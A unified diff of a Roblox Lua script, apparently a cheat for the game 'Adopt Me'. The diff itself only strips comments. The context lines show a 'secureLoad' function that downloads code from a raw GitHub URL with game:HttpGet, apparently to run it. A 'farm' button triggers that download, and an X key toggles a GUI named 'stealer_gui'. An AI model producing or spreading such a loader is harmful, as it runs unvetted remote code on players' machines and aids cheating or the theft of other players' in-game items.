@@ -1,4 +1,3 @@
-
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local SoundService = game:GetService("SoundService")
@@ -69,7 +68,7 @@ button.MouseButton1Click:Connect(function()
     task.spawn(farm)  -- Run the farming function
 end)
 
--- Securely Load External Script
+
 local function secureLoad(url)
     local success, scriptContent = pcall(function()
         return game:HttpGet(url)
@@ -81,19 +80,19 @@ local function secureLoad(url)
     end
 end
 
--- Load Scripts
+
 local function farm()
     secureLoad('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting-adopt-me/main/script')
 end
 
--- Toggle GUI with "X" Keybind
+
 UIS.InputBegan:Connect(function(input, gameProcessed)
     if not gameProcessed and input.KeyCode == Enum.KeyCode.X then
         stealer_gui.Enabled = not stealer_gui.Enabled
     end
 end)
 
--- Add Tween Animation to Show GUI
+
 local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 local fadeIn = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0})
 
